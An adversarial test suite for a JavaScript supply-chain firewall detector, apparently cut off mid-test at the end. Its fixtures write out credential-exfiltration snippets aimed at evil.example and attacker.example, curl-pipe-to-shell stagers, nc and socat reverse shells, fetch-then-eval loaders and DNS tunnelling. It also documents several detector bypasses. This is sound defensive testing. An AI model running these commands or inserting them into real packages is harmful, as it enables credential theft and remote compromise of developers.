// packages/fw-control/test/adversarial/adversarial.test.js
// Adversarial bypass test suite for the Helios Runtime Firewall.
//
// Tests attempt real-world evasion techniques against the detector.
// For each test: BLOCKED = firewall stopped it, BYPASSED = firewall missed it.
// Bypassed cases are documented below as known limitations / future work.
//
// Run: node packages/fw-control/test/adversarial/adversarial.test.js

const assert = require('assert');
const path = require('path');
const fs = require('fs');
const os = require('os');

// Load detector directly (not the full agent) for unit-level adversarial testing
const { Detector } = require('../../../fw-agent/src/detector');

// ─── helpers ─────────────────────────────────────────────────────────────────

function pad(src) {
  // pad() makes tests 1-12 realistic-length; sub-512B cases are covered by tests 13/14
  return src + '\n// ' + 'x'.repeat(600);
}

const results = [];

function test(name, fn) {
  detector.behaviorTracker.reset();
  try {
    fn();
    results.push({ name, status: 'PASS' });
  } catch (e) {
    results.push({ name, status: 'FAIL', error: e.message });
  }
}

function expectBlocked(scanResult) {
  assert.ok(
    scanResult.detections.length > 0,
    `Expected detection but got none. action=${scanResult.action}`
  );
}

function expectBypassed(scanResult) {
  // We EXPECT these to slip past the current detector. Documenting them as known gaps.
  assert.strictEqual(
    scanResult.detections.length, 0,
    `Expected bypass (detector should miss this) but it was caught: ${JSON.stringify(scanResult.detections)}`
  );
}

// ─── test cases ──────────────────────────────────────────────────────────────

const detector = new Detector(new Map());

// 1. Direct eval – should be blocked by signature scanner
test('Direct eval() is blocked', () => {
  const src = pad(`
    const code = 'require("child_process").exec("id")';
    eval(code);
    module.exports = {};
  `);
  const result = detector.scanModuleSync('direct-eval.js', src, 'direct-eval.js');
  expectBlocked(result);
});

// 2. eval via property bracket access – signature scanner BYPASSED (known limitation)
//    Behavioral analysis also misses this because it still matches /\beval\s*\(/ if the
//    bracket is dynamic; this is a documented bypass requiring AST analysis.
test('Obfuscated eval via bracket access is a known bypass [EXPECTED BYPASS]', () => {
  const src = pad(`
    const fn = this['ev' + 'al'];
    fn('process.exit(0)');
    module.exports = {};
  `);
  const result = detector.scanModuleSync('bracket-eval.js', src, 'bracket-eval.js');
  // EXPECTED: bypasses signature scanner. Document as future work (AST-level detection needed).
  try {
    expectBypassed(result);
    console.log('  [KNOWN BYPASS] bracket-notation eval evades signature + regex detection');
    console.log('  Future work: instrument via Proxy on globalThis or AST pre-processing');
  } catch (e) {
    // If behavioral tracker catches it, that is a bonus — still pass the test
    console.log('  [NOTE] bracket-notation eval was caught by behavioral analysis');
  }
});

// 3. String split across concatenation – should bypass signature scanner
test('eval with string concatenation bypass is a known bypass [EXPECTED BYPASS]', () => {
  const src = pad(`
    const a = 'ev';
    const b = 'al';
    const fn = global[a + b];
    fn('1+1');
    module.exports = {};
  `);
  const result = detector.scanModuleSync('concat-eval.js', src, 'concat-eval.js');
  try {
    expectBypassed(result);
    console.log('  [KNOWN BYPASS] string-concatenation eval evades both scanner and behavioral analysis');
    console.log('  Future work: taint-tracking or V8 Inspector API integration');
  } catch (e) {
    console.log('  [NOTE] concatenation eval was caught');
  }
});

// 4. Base64-encoded payload decoded via Buffer.from then eval'd – behavioral
// OBFUSCATED_CODE_EXECUTION rule catches the decode+exec combination (F-31).
// NOTE: this fixture is deliberately COMMENT-FREE. A prior version carried a
// `// Encodes: require('child_process').exec(...)` comment whose plaintext
// child_process/exec strings (matched against raw content) completed
// DYNAMIC_CODE_EXEC_CHAIN — so the test "passed" for the wrong reason and masked
// a real gap: strip the comment and the payload used to run (action=OBSERVE).
// It must now block on the decode→eval sequence alone.
test('Buffer.from base64 decode + eval is blocked by OBFUSCATED_CODE_EXECUTION', () => {
  const src = pad(`
    const payload = Buffer.from('cGF5bG9hZCBnb2VzIGhlcmU=', 'base64').toString();
    eval(payload);
    module.exports = {};
  `);
  const result = detector.scanModuleSync('base64-payload.js', src, 'base64-payload.js');
  expectBlocked(result);
  const isObfuscated = result.detections.some(d => d.rule === 'OBFUSCATED_CODE_EXECUTION');
  assert.ok(isObfuscated, 'Expected OBFUSCATED_CODE_EXECUTION behavioral detection');
});

// 4b. Regression guard for the F-31 gap surface: the decode primitive and the eval
// must BOTH be real code for the rule to fire. A decode named only in a comment must
// NOT manufacture a block (codeDecode is matched against comment-stripped scanSrc),
// and neither primitive blocks alone (F-20 keeps bare eval/Buffer.from WARN-only).
test('Decode-only and eval-only modules do NOT false-positive (F-31 guard)', () => {
  // legit: JWT/HTTP libraries decode base64 constantly, never eval it
  const decodeOnly = pad(`const raw = Buffer.from(token, 'base64').toString('utf8'); module.exports = JSON.parse(raw);`);
  const r1 = detector.scanModuleSync('decode-only.js', decodeOnly, 'decode-only.js');
  assert.ok(!r1.detections.some(d => !d.warnOnly), 'decode-only must not hard-block');

  // legit: build tool evaluates a constant expression, no decode
  const evalOnly = pad(`module.exports = eval('1 + 2');`);
  const r2 = detector.scanModuleSync('eval-only.js', evalOnly, 'eval-only.js');
  assert.ok(!r2.detections.some(d => !d.warnOnly), 'eval-only must not hard-block');

  // a decode mentioned only in a comment + a real eval must NOT block
  const commentDecode = pad(`// Buffer.from(x, 'base64') would decode it\nmodule.exports = eval('40 + 2');`);
  const r3 = detector.scanModuleSync('comment-decode.js', commentDecode, 'comment-decode.js');
  assert.ok(!r3.detections.some(d => !d.warnOnly), 'comment-only decode must not manufacture a block');
});

// 5. Crypto-miner stratum reference – signature scanner catches 'stratum'
test('Crypto-miner stratum pool reference is blocked', () => {
  const src = pad(`
    const poolUrl = 'stratum+tcp://pool.hashvault.pro:8080';
    module.exports = { connect: () => poolUrl };
  `);
  const result = detector.scanModuleSync('miner.js', src, 'miner.js');
  expectBlocked(result);
  const isCritical = result.detections.some(d => d.severity === 'CRITICAL');
  assert.ok(isCritical, 'Expected CRITICAL severity for crypto-miner');
});

// 6. Behavioral: sensitive file read + network call in same module
test('Credential-read + network-egress in one module triggers behavioral detection', () => {
  const src = pad(`
    const fs = require('fs');
    const https = require('https');
    const token = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');
    https.request({ hostname: 'attacker.example', path: '/?t=' + token });
    module.exports = {};
  `);
  const result = detector.scanModuleSync('cred-exfil.js', src, 'cred-exfil.js');
  expectBlocked(result);
  const hasBehavioral = result.detections.some(d => d.type === 'behavioral');
  assert.ok(hasBehavioral, 'Expected behavioral detection (CREDENTIAL_EXFILTRATION)');
});

// 7. Behavioral: eval + child_process.exec in same module
test('Dynamic-code + process-exec in one module triggers behavioral detection', () => {
  const src = pad(`
    const { exec } = require('child_process');
    const code = getExternalCode();
    eval(code);
    exec(code);
    module.exports = {};
  `);
  const result = detector.scanModuleSync('code-exec.js', src, 'code-exec.js');
  expectBlocked(result);
  const hasBehavioral = result.detections.some(d => d.type === 'behavioral');
  assert.ok(hasBehavioral, 'Expected behavioral detection (DYNAMIC_CODE_EXEC_CHAIN)');
});

// 8. Postinstall curl pipe – simulates supply-chain fetch
test('curl | bash postinstall pattern is blocked by signature scanner', () => {
  const src = pad(`
    const { execSync } = require('child_process');
    execSync('curl https://evil.example/install.sh | bash');
    module.exports = {};
  `);
  const result = detector.scanModuleSync('postinstall.js', src, 'postinstall.js');
  expectBlocked(result);
});

// 9. Process.env access + network call — F-16: bare env reads no longer hard-block.
// CREDENTIAL_EXFILTRATION (CRITICAL) requires a genuine credential file read or a sensitive
// path string. A plain process.env read + network call now emits ENV_NETWORK_EGRESS (WARN)
// and is logged but not quarantined. Genuine exfiltration (file read + network) is still
// caught at CRITICAL — see test 6.
test('process.env + network call emits ENV_NETWORK_EGRESS WARN but does not hard-block (F-16)', () => {
  const src = pad(`
    const token = process.env.NPM_TOKEN || process.env.GITHUB_TOKEN;
    const https = require('https');
    https.request({ hostname: 'c2.example', path: '/exfil?t=' + token });
    module.exports = {};
  `);
  const result = detector.scanModuleSync('env-exfil.js', src, 'env-exfil.js');
  // Must surface a WARN-level ENV_NETWORK_EGRESS detection (for logging/telemetry)
  const warnDetection = result.detections.find(d => d.rule === 'ENV_NETWORK_EGRESS');
  assert.ok(warnDetection, `Expected ENV_NETWORK_EGRESS WARN detection but got: ${JSON.stringify(result.detections)}`);
  assert.strictEqual(warnDetection.severity, 'WARN', 'ENV_NETWORK_EGRESS should be WARN severity');
  assert.strictEqual(warnDetection.warnOnly, true, 'ENV_NETWORK_EGRESS must be warnOnly');
  // Must NOT hard-block (no CRITICAL/HIGH detections)
  const hardBlock = result.detections.find(d => !d.warnOnly);
  assert.ok(!hardBlock, `process.env + network must not hard-block (F-16). Got: ${JSON.stringify(hardBlock)}`);
  assert.strictEqual(result.action, 'OBSERVE', `Action must be OBSERVE, got: ${result.action}`);
});

// 10. Clean module – must NOT be blocked
test('Clean module passes without false positive', () => {
  const src = pad(`
    function add(a, b) { return a + b; }
    function subtract(a, b) { return a - b; }
    module.exports = { add, subtract };
  `);
  const result = detector.scanModuleSync('math.js', src, 'math.js');
  assert.strictEqual(result.detections.length, 0, 'Clean module should produce no detections');
  assert.strictEqual(result.action, 'OBSERVE', 'Clean module action should be OBSERVE');
});

// 11. Variable-alias eval – eval assigned to a variable, then called
//     Signature scanner looks for 'eval(' but `fn('1+1')` doesn't match.
test('Variable-alias eval is a known bypass [EXPECTED BYPASS]', () => {
  const src = pad(`
    const fn = eval;
    fn('1+1');
    module.exports = {};
  `);
  const result = detector.scanModuleSync('alias-eval.js', src, 'alias-eval.js');
  try {
    expectBypassed(result);
    console.log('  [KNOWN BYPASS] variable-alias eval evades signature scanner (no "eval(" in source)');
    console.log('  Future work: runtime Proxy on globalThis.eval or V8 Inspector hooks');
  } catch (e) {
    console.log('  [NOTE] variable-alias eval was caught (cross-module state effect)');
  }
});

// 12. Newline-split string reassembly
test('Multi-line string reassembly is a known bypass [EXPECTED BYPASS]', () => {
  const src = pad(`
    const a = ['ch', 'ild', '_pr', 'oc', 'ess'].join('');
    const m = require(a);
    m.exec('id');
    module.exports = {};
  `);
  const result = detector.scanModuleSync('split-string.js', src, 'split-string.js');
  try {
    expectBypassed(result);
    console.log('  [KNOWN BYPASS] join-reassembled module name evades signature scanner');
    console.log('  Future work: dynamic taint analysis on string operations');
  } catch (e) {
    console.log('  [NOTE] join-reassembly was caught');
  }
});

// 13. Sub-512B malicious module — F-01 regression guard
// This fixture MUST be blocked. It previously bypassed the scanner entirely due to the
// 512-byte pre-filter that was removed in the F-01 fix.
test('Sub-512-byte malicious module is blocked (F-01 regression guard)', () => {
  const tiny = 'eval(require("child_process").exec("id"));\nmodule.exports = {};\n// ' + 'x'.repeat(420);
  assert.ok(tiny.length < 512, `Fixture must be <512 bytes (actual: ${tiny.length})`);
  const result = detector.scanModuleSync('tiny-malware.js', tiny, 'tiny-malware.js');
  expectBlocked(result);
});

// 14. Sub-512B clean module — F-01 false-positive guard
test('Sub-512-byte clean module has no false positive (F-01 regression guard)', () => {
  const tiny = 'module.exports = a => a + 1;\n// ' + 'x'.repeat(450);
  assert.ok(tiny.length < 512, `Fixture must be <512 bytes (actual: ${tiny.length})`);
  const result = detector.scanModuleSync('tiny-clean.js', tiny, 'tiny-clean.js');
  assert.strictEqual(result.detections.length, 0, 'Clean tiny module should produce no detections');
});

// 15. Padding bypass (F-03 regression guard)
// Malicious payload buried after 3 KB of benign-looking filler.
// Previously the 2 KB truncation would have caused the scanner to miss it entirely.
test('Padded-payload: malicious signature after 3KB padding is blocked (F-03 regression guard)', () => {
  const padding = '// ' + 'a'.repeat(3000) + '\n';
  const payload = 'module.exports.connect = () => require("net").createConnection("stratum+tcp://pool.example.com", 3333);\n';
  const src = padding + payload;
  assert.ok(src.length > 3000, `Fixture must exceed 3000 bytes (actual: ${src.length})`);
  const result = detector.scanModuleSync('padded-miner.js', src, 'padded-miner.js');
  const blockDetections = result.detections.filter(d => !d.warnOnly);
  assert.ok(
    blockDetections.length > 0,
    `Expected BLOCK-tier detection for padded payload but got none. detections=${JSON.stringify(result.detections)}`
  );
});

// 16. Small module (<100 bytes) behavioral detection (F-07 regression guard)
// Previously behavior-tracker.js had a `content.length < 100` guard that silently skipped
// tiny modules. Even a short module that reads a credential file and makes a network call
// must be caught. Uses a genuine file-based credential read (fs.readFileSync + .npmrc path)
// so the CRITICAL CREDENTIAL_EXFILTRATION rule fires — bare process.env is intentionally
// demoted to WARN by F-16 and would not satisfy the block-tier assertion here.
test('Sub-100-byte module with credential-read + network-egress triggers behavioral detection (F-07 regression guard)', () => {
  detector.behaviorTracker.reset();
  // Short payload: reads .npmrc (sensitiveRead + sensitivePath) and makes a network call
  const src = "fs.readFileSync('.npmrc'); require('https').get('http://evil.com');";
  assert.ok(src.length < 100, `Fixture must be <100 bytes (actual: ${src.length})`);
  const result = detector.scanModuleSync('tiny-exfil.js', src, 'tiny-exfil.js');
  const blockDetections = result.detections.filter(d => !d.warnOnly);
  assert.ok(
    blockDetections.length > 0,
    `Expected behavioral CREDENTIAL_EXFILTRATION detection but got none. detections=${JSON.stringify(result.detections)}`
  );
});

// 17. One-line chained require().readFileSync('.env') idiom (F-27b regression guard)
// F-27's line-drop specifier stripping matched `^\s*const\s+.*=\s*require\s*\(` and deleted
// the ENTIRE line, so `const s = require('fs').readFileSync('.env')` lost its '.env' argument
// along with the 'fs' specifier and silently passed CLEAN. This is the most common one-line
// credential-theft idiom (require(...).readFileSync(...) chained in a single statement) and
// MUST be blocked. The fix blanks only the module specifier STRING in place, so the chained
// .readFileSync('.env') call survives for SENSITIVE_PATH matching.
test('One-line require(fs).readFileSync(.env) chain is blocked (F-27b regression guard)', () => {
  detector.behaviorTracker.reset();
  const src = pad(`
    const s = require('fs').readFileSync('.env');
    require('https').get('http://x?d='+s);
    module.exports = {};
  `);
  const result = detector.scanModuleSync('chained-env-exfil.js', src, 'chained-env-exfil.js');
  expectBlocked(result);
  const credExfil = result.detections.find(d => d.rule === 'CREDENTIAL_EXFILTRATION');
  assert.ok(credExfil, `Expected CREDENTIAL_EXFILTRATION detection but got: ${JSON.stringify(result.detections)}`);
  assert.strictEqual(credExfil.severity, 'CRITICAL', 'CREDENTIAL_EXFILTRATION should be CRITICAL severity');
});

// 18. Dictionary word list containing "stratum" is not a crypto-miner (F-29 regression guard)
// Bare 'stratum' matched the mining-protocol word wherever it appeared in ordinary English
// (dictionary/word-list packages), false-positiving e.g. @danielhaim/titlecaser. The
// signature is now the pool-URL scheme ('stratum+tcp'/'stratum://'), which a plain word list
// never contains.
test('Word list containing "stratum"/"substratum"/"stratus" is not flagged as a crypto-miner (F-29 regression guard)', () => {
  const src = pad(`
    const words = ["stratification", "stratum", "stratus", "substratum"];
    module.exports = { words };
  `);
  const result = detector.scanModuleSync('word-list.js', src, 'word-list.js');
  assert.strictEqual(result.detections.length, 0, `Expected no detections but got: ${JSON.stringify(result.detections)}`);
});

// 19. F-30 redo: whole-.npmrc exfil, no token field name ever appears (regression guard)
// The first cut of F-30 gated escalation on the literal string `_authToken` appearing in the
// module. Real .npmrc-stealers don't bother parsing the file -- they just read the whole
// thing and ship it. That variant never named a token field and slipped through as WARN.
// The discriminator that holds is the destination (hardcoded vs. built from config), not
// whether a field name is parsed out of the file.
test('F-30 redo: whole .npmrc read + hardcoded exfil URL is blocked (no _authToken string present)', () => {
  const src = pad(`
    const fs = require('fs');
    const os = require('os');
    const t = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
    fetch('http://evil.example/c?d=' + t);
    module.exports = {};
  `);
  const result = detector.scanModuleSync('npmrc-whole-exfil.js', src, 'npmrc-whole-exfil.js');
  expectBlocked(result);
  const credExfil = result.detections.find(d => d.rule === 'CREDENTIAL_EXFILTRATION');
  assert.ok(credExfil, `Expected CREDENTIAL_EXFILTRATION but got: ${JSON.stringify(result.detections)}`);
  assert.strictEqual(credExfil.severity, 'CRITICAL');
});

// 20. F-30 redo: .npmrc contents as a POST body to a hardcoded host (regression guard)
test('F-30 redo: .npmrc read + POST body to a hardcoded host is blocked', () => {
  const src = pad(`
    const fs = require('fs');
    const t = fs.readFileSync('.npmrc', 'utf8');
    https.request('https://evil.example/collect', { method: 'POST' }).end(t);
    module.exports = {};
  `);
  const result = detector.scanModuleSync('npmrc-post-exfil.js', src, 'npmrc-post-exfil.js');
  expectBlocked(result);
  const credExfil = result.detections.find(d => d.rule === 'CREDENTIAL_EXFILTRATION');
  assert.ok(credExfil, `Expected CREDENTIAL_EXFILTRATION but got: ${JSON.stringify(result.detections)}`);
  assert.strictEqual(credExfil.severity, 'CRITICAL');
});

// 21. F-30 redo: _authToken extraction redirected via an explicit {host:...} override (regression guard)
test('F-30 redo: .npmrc _authToken extraction with a {host: ...} override is blocked', () => {
  const src = pad(`
    const fs = require('fs');
    const cfg = fs.readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
    const m = cfg.match(/_authToken=(.+)/);
    https.request({ host: 'evil.example', path: '/c' }).end(m[1]);
    module.exports = {};
  `);
  const result = detector.scanModuleSync('npmrc-token-host-exfil.js', src, 'npmrc-token-host-exfil.js');
  expectBlocked(result);
  const credExfil = result.detections.find(d => d.rule === 'CREDENTIAL_EXFILTRATION');
  assert.ok(credExfil, `Expected CREDENTIAL_EXFILTRATION but got: ${JSON.stringify(result.detections)}`);
  assert.strictEqual(credExfil.severity, 'CRITICAL');
});

// 22. F-30 redo: legit npm tooling builds the URL from config, not blocked (regression guard)
test('F-30 redo: npm tooling reading .npmrc to resolve the registry, then fetching from config, is not blocked', () => {
  const src = pad(`
    const path = require('path');
    const os = require('os');
    const fs = require('fs');
    const p = path.join(os.homedir(), '.npmrc');
    const content = fs.readFileSync(p, 'utf8');
    const match = content.match(/^\\s*registry\\s*=\\s*(.+)/m);
    const registry = match ? match[1].trim() : 'https://registry.npmjs.org';
    const response = await fetch(\`\${registry}/\${name}\`);
    module.exports = {};
  `);
  const result = detector.scanModuleSync('npmrc-legit-config-url.js', src, 'npmrc-legit-config-url.js');
  const hardBlock = result.detections.find(d => !d.warnOnly);
  assert.ok(!hardBlock, `Legit npm tooling must not hard-block. Got: ${JSON.stringify(hardBlock)}`);
});

// 23. F-30 redo: hardcoded 'https://registry.npmjs.org' as a fallback DEFAULT next to a
// config-driven fetch must not false-positive (regression guard for a gap found in review of
// the F-30 redo itself: an earlier draft of this fix matched "any quoted absolute URL
// anywhere in the file", which caught this exact fallback-default idiom and would have
// wrongly blocked it). The fix anchors HARDCODED_EGRESS_CALL to the network-call argument
// itself, so a literal sitting in an unrelated assignment doesn't count.
test('F-30 redo: hardcoded registry.npmjs.org fallback default (not the actual fetch target) is not blocked', () => {
  const src = pad(`
    const fs = require('fs');
    const content = fs.readFileSync('.npmrc', 'utf8');
    const match = content.match(/^\\s*registry\\s*=\\s*(.+)/m);
    const registry = match ? match[1].trim() : 'https://registry.npmjs.org';
    const response = await fetch(\`\${registry}/\${name}\`);
    module.exports = {};
  `);
  const result = detector.scanModuleSync('npmrc-fallback-default.js', src, 'npmrc-fallback-default.js');
  const hardBlock = result.detections.find(d => !d.warnOnly);
  assert.ok(!hardBlock, `Fallback-default constant must not hard-block. Got: ${JSON.stringify(hardBlock)}`);
});

// 24. F-30 redo: hardcoded call-site fetch of the REAL npm registry is WARN, not a hard block
// (regression guard). Some legit tools hardcode registry.npmjs.org directly at the call site
// instead of building it from config -- indistinguishable from theft by "hardcoded
// destination" alone. Policy: soften to WARN specifically for registry.npmjs.org; any other
// hardcoded host still blocks (see tests 19-21).
test('F-30 redo: hardcoded fetch of registry.npmjs.org itself is WARN, not a hard block', () => {
  const src = pad(`
    const fs = require('fs');
    const content = fs.readFileSync('.npmrc', 'utf8');
    const response = await fetch('https://registry.npmjs.org/' + name);
    module.exports = {};
  `);
  const result = detector.scanModuleSync('npmrc-hardcoded-real-registry.js', src, 'npmrc-hardcoded-real-registry.js');
  const hardBlock = result.detections.find(d => !d.warnOnly);
  assert.ok(!hardBlock, `Hardcoded fetch of the real npm registry must not hard-block. Got: ${JSON.stringify(hardBlock)}`);
  const warnDetection = result.detections.find(d => d.rule === 'NPMRC_NETWORK_EGRESS');
  assert.ok(warnDetection, `Expected NPMRC_NETWORK_EGRESS WARN detection but got: ${JSON.stringify(result.detections)}`);
});

// ─────────────────────────────────────────────────────────────────────────────
// Phase 1 gap-closure guards (red-team suite groups B/C/E). Each new rule ships with
// a true-positive AND a false-positive test.
// ─────────────────────────────────────────────────────────────────────────────

// F-35a. Miner brand not covered by a stratum literal is blocked as a crypto-miner.
test('Miner brand signature (coinimp) is blocked and labeled crypto-miner (F-35 TP)', () => {
  const src = pad(`const m = new Client.Anonymous('coinimp-site-key'); m.start(); module.exports = m;`);
  const result = detector.scanModuleSync('miner-coinimp.js', src, 'miner-coinimp.js');
  expectBlocked(result);
  const crypto = result.detections.find(d => d.type === 'crypto-miner');
  assert.ok(crypto, `Expected crypto-miner label but got: ${JSON.stringify(result.detections)}`);
});

// F-35b. isCrypto relabel: coinhive now tags crypto-miner (CRITICAL), not dynamic-code-exec.
test('coinhive signature is labeled crypto-miner after isCrypto fix (F-35 label)', () => {
  const src = pad(`const CoinHive = require('coinhive'); module.exports = CoinHive;`);
  const result = detector.scanModuleSync('coinhive.js', src, 'coinhive.js');
  const crypto = result.detections.find(d => d.type === 'crypto-miner' && d.severity === 'CRITICAL');
  assert.ok(crypto, `coinhive should be labeled crypto-miner/CRITICAL: ${JSON.stringify(result.detections)}`);
});

// F-35c. FP guard: "coin"/"pool"/"miner" as ordinary words (no brand literal) must not block.
test('Prose mentioning coin/pool/miner without a brand literal is not blocked (F-35 FP)', () => {
  const src = pad(`
    // Manages a pool of database connections for the coin-tracker miner dashboard.
    const poolSize = 10; const minerCount = 3; module.exports = { poolSize, minerCount };
  `);
  const result = detector.scanModuleSync('pool-manager.js', src, 'pool-manager.js');
  assert.ok(!result.detections.some(d => !d.warnOnly), `Must not hard-block: ${JSON.stringify(result.detections)}`);
});

// F-36a. Inline require("net").connect + credential read → CREDENTIAL_EXFILTRATION.
test('Inline require("net").connect + .aws read is blocked (F-36 TP)', () => {
  const src = pad(`
    const a = require('fs').readFileSync(require('os').homedir() + '/.aws/credentials', 'utf8');
    const s = require('net').connect(9999, 'evil.example', () => s.write(a));
    module.exports = {};
  `);
  const result = detector.scanModuleSync('inline-net.js', src, 'inline-net.js');
  const credExfil = result.detections.find(d => d.rule === 'CREDENTIAL_EXFILTRATION');
  assert.ok(credExfil, `Expected CREDENTIAL_EXFILTRATION but got: ${JSON.stringify(result.detections)}`);
});

// F-36b. Inline require("vm").runInThisContext + child_process → DYNAMIC_CODE_EXEC_CHAIN.
test('Inline require("vm").runInThisContext + spawn is blocked (F-36 TP)', () => {
  const src = pad(`require('vm').runInThisContext(payload); require('child_process').spawnSync('id'); module.exports = {};`);
  const result = detector.scanModuleSync('inline-vm.js', src, 'inline-vm.js');
  const chain = result.detections.find(d => d.rule === 'DYNAMIC_CODE_EXEC_CHAIN');
  assert.ok(chain, `Expected DYNAMIC_CODE_EXEC_CHAIN but got: ${JSON.stringify(result.detections)}`);
});

// F-36c. FP guard: inline require("https").get in a plain HTTP client (no credential read) is clean.
test('Inline require("https").get without a credential read is not blocked (F-36 FP)', () => {
  const src = pad(`
    module.exports = (url, cb) => require('https').get(url, cb);
  `);
  const result = detector.scanModuleSync('http-client.js', src, 'http-client.js');
  assert.ok(!result.detections.some(d => !d.warnOnly), `Must not hard-block: ${JSON.stringify(result.detections)}`);
});

// F-37a. Infra cred store (.kube/config) + hardcoded non-registry exfil host → CRITICAL.
test('.kube/config read + hardcoded exfil host is blocked (F-37 TP)', () => {
  const src = pad(`
    const k = require('fs').readFileSync(require('os').homedir() + '/.kube/config', 'utf8');
    fetch('https://evil.example/k', { method: 'POST', body: k });
    module.exports = {};
  `);
  const result = detector.scanModuleSync('kube-exfil.js', src, 'kube-exfil.js');
  const credExfil = result.detections.find(d => d.rule === 'CREDENTIAL_EXFILTRATION');
  assert.ok(credExfil, `Expected CREDENTIAL_EXFILTRATION but got: ${JSON.stringify(result.detections)}`);
});

// F-37b. FP guard: a legit k8s client reads .kube/config and connects to a CONFIG-DERIVED
// server (no hardcoded attacker host) — must NOT block, or we false-positive on
// @kubernetes/client-node and every docker/browser tool that reads these files.
test('.kube/config read + config-derived (non-hardcoded) server is clean (F-37 FP)', () => {
  const src = pad(`
    const k = require('fs').readFileSync(require('os').homedir() + '/.kube/config', 'utf8');
    const cfg = parseYaml(k);
    fetch(cfg.clusters[0].server + '/api/v1/pods', { headers: cfg.headers });
    module.exports = {};
  `);
  const result = detector.scanModuleSync('kube-client.js', src, 'kube-client.js');
  assert.ok(!result.detections.some(d => !d.warnOnly), `Legit k8s client must not hard-block: ${JSON.stringify(result.detections)}`);
});

// F-38a. Pipe-to-shell stager (curl ... | sh) is blocked (the "| bash" literal misses sh/dash/zsh).
test('curl ... | sh stager is blocked (F-38 TP)', () => {
  const src = pad(`require('child_process').execSync('curl -s https://evil.example/i.sh | sh'); module.exports = {};`);
  const result = detector.scanModuleSync('pipe-sh.js', src, 'pipe-sh.js');
  expectBlocked(result);
  assert.ok(result.detections.some(d => !d.warnOnly), 'pipe-to-shell stager must hard-block');
});

// F-38b. FP guard: the anchored \bsh\b regex must NOT match "| sha256sum" or "| ssh host".
test('Pipe to sha256sum / ssh does not false-positive as a shell stager (F-38 FP)', () => {
  const src = pad(`
    const { execSync } = require('child_process');
    execSync('cat file | sha256sum');
    execSync('tar czf - dir | ssh host "cat > backup.tgz"');
    module.exports = {};
  `);
  const result = detector.scanModuleSync('safe-pipes.js', src, 'safe-pipes.js');
  assert.ok(!result.detections.some(d => !d.warnOnly), `sha256sum/ssh pipes must not hard-block: ${JSON.stringify(result.detections.filter(d => !d.warnOnly))}`);
});

// ─────────────────────────────────────────────────────────────────────────────
// Phase 2 gap-closure guards (red-team groups D/E). New behavioral rules + tool sigs.
// ─────────────────────────────────────────────────────────────────────────────

// F-39a. REMOTE_FETCH_EXEC: fetch a remote payload and eval it → HIGH block.
test('fetch(...).then(eval) is blocked by REMOTE_FETCH_EXEC (F-39 TP)', () => {
  const src = pad(`fetch('https://cdn.example/a.js').then(r=>r.text()).then(t=>eval(t)); module.exports = {};`);
  const result = detector.scanModuleSync('fetch-eval.js', src, 'fetch-eval.js');
  const r = result.detections.find(d => d.rule === 'REMOTE_FETCH_EXEC');
  assert.ok(r, `Expected REMOTE_FETCH_EXEC but got: ${JSON.stringify(result.detections)}`);
});

// F-39b. REMOTE_FETCH_EXEC via indirect (0, eval) on a fetched payload.
test('fetch(...).then((0,eval)) is blocked by REMOTE_FETCH_EXEC (F-39 TP indirect)', () => {
  const src = pad(`fetch('https://raw.githubusercontent.com/e/x/main/p.js').then(r=>r.text()).then(t=>(0,eval)(t)); module.exports = {};`);
  const result = detector.scanModuleSync('fetch-indirect-eval.js', src, 'fetch-indirect-eval.js');
  assert.ok(result.detections.some(d => d.rule === 'REMOTE_FETCH_EXEC'), `Expected REMOTE_FETCH_EXEC: ${JSON.stringify(result.detections)}`);
});

// F-39c. FP guard: fetch that parses JSON (no code execution) must NOT block.
test('fetch(...).then(r=>r.json()) without eval is not blocked (F-39 FP)', () => {
  const src = pad(`module.exports = () => fetch('https://api.example/x').then(r => r.json());`);
  const result = detector.scanModuleSync('fetch-json.js', src, 'fetch-json.js');
  assert.ok(!result.detections.some(d => !d.warnOnly), `fetch+json must not block: ${JSON.stringify(result.detections)}`);
});

// F-39d. FP guard: new Function used for local codegen (no network) must NOT block.
test('new Function without network egress is not blocked (F-39 FP)', () => {
  const src = pad(`const add = new Function('a', 'b', 'return a + b'); module.exports = add;`);
  const result = detector.scanModuleSync('codegen.js', src, 'codegen.js');
  assert.ok(!result.detections.some(d => !d.warnOnly), `local codegen must not block: ${JSON.stringify(result.detections)}`);
});

// F-40a. Reverse-shell tool signature (nc -e) is blocked.
test('nc -e reverse shell is blocked (F-40 TP)', () => {
  const src = pad(`require('child_process').exec('nc -e /bin/sh attacker.example 4444'); module.exports = {};`);
  const result = detector.scanModuleSync('nc-e.js', src, 'nc-e.js');
  expectBlocked(result);
  assert.ok(result.detections.some(d => d.type === 'reverse-shell'), `Expected reverse-shell: ${JSON.stringify(result.detections)}`);
});

// F-40b. Reverse-shell tool signature (socat EXEC) is blocked.
test('socat ... EXEC: reverse shell is blocked (F-40 TP)', () => {
  const src = pad(`require('child_process').exec('socat TCP:attacker.example:4444 EXEC:/bin/bash,pty'); module.exports = {};`);
  const result = detector.scanModuleSync('socat.js', src, 'socat.js');
  expectBlocked(result);
});

// F-40c. FP guard: the anchored tool regexes must not match benign command strings that merely
// contain the trigger as a substring — rsync -e (contains "nc -e"), a pipe into ssh (not sh).
test('Benign rsync -e / pipe-to-ssh command strings do not false-positive (F-40 FP)', () => {
  const src = pad(`
    const { execSync } = require('child_process');
    execSync('rsync -e ssh user@host:/src /dst');
    execSync('tar c - dir | ssh host "cat > backup.tgz"');
    module.exports = {};
  `);
  const result = detector.scanModuleSync('benign-cmds.js', src, 'benign-cmds.js');
  assert.ok(!result.detections.some(d => !d.warnOnly), `benign cmds must not block: ${JSON.stringify(result.detections.filter(d => !d.warnOnly))}`);
});

// F-41a. DNS-tunnel exfil: .env read + dns.resolve egress channel → CREDENTIAL_EXFILTRATION.
test('.env read + dns.resolve exfil channel is blocked (F-41 TP)', () => {
  const src = pad(`
    const fs = require('fs'); const dns = require('dns');
    const data = fs.readFileSync('.env', 'utf8');
    dns.resolve(Buffer.from(data).toString('hex').slice(0, 60) + '.evil.example', () => {});
    module.exports = {};
  `);
  const result = detector.scanModuleSync('dns-tunnel.js', src, 'dns-tunnel.js');
  assert.ok(result.detections.some(d => d.rule === 'CREDENTIAL_EXFILTRATION'), `Expected CREDENTIAL_EXFILTRATION: ${JSON.stringify(result.detections)}`);
});

// F-41b. process.binding + eval completes the DYNAMIC_CODE_EXEC_CHAIN.
test('process.binding("spawn_sync") + eval is blocked (F-41 TP)', () => {
